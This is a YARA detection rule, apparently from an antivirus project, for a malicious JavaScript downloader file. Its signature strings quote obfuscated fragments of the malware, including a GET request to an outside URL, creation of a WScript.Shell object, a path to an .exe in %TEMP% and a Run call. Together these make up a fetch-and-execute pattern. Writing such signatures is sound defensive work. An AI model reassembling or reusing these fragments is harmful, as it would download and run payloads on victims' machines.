rule sig_20160330_9b7baa592df611658731a6983e00781a {
  meta:
    description = "datamaliciousorder - file 20160330_9b7baa592df611658731a6983e00781a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "77e0e8541bf3502b41c7f82a155644cee5c8d877911f4ecfb169f8588c586874"

  strings:
    $s1  = "_GQ[_DY](\"GET\", \"http://linkownia.itcom.pl/s9aps\", false);" fullword ascii
    $s2  = "var _V = function _W() {return WScript[_YY0](\"WScript\"+\".Shell\");}(), _Z2 = 11;" fullword ascii
    $s3  = "function _C(_TW, _S){_Z = _Z * 1; return _TW - _S;};" fullword ascii
    $s4  = "if (_GQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _SC() {return _V[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"N7KCStP3MnIxiK.ex\" + \"e\";};" fullword ascii
    $s6  = "function _ZB(){return _JX + \"\";};" fullword ascii
    $s7  = "function _Y(_G0){_V[\"Run\"](_G0, _Z, _Z);};" fullword ascii
    $s8  = "function _GW() {return ((_X0 == true) && (_X0 == _G1)) ? 1 : _Z;};" fullword ascii
    $s9  = "var _T0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function _CD(_Z0) {var _VQ = (1, 2, 3, 4, 5, _Z0); return _VQ;};" fullword ascii
    $s11 = "function _T(){return 22;};" fullword ascii
    $s12 = "return _C(_X, _OF);" fullword ascii
    $s13 = "function _YY(){return _YY0;};" fullword ascii
    $s14 = "function _J()" fullword ascii
    $s15 = " while (_Z1){" fullword ascii
    $s16 = "var _X0 = false;" fullword ascii
    $s17 = "_X0 = true; " fullword ascii
    $s18 = "_G1 = true; " fullword ascii
    $s19 = "var _G2 = false;" fullword ascii
    $s20 = "var _G1 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}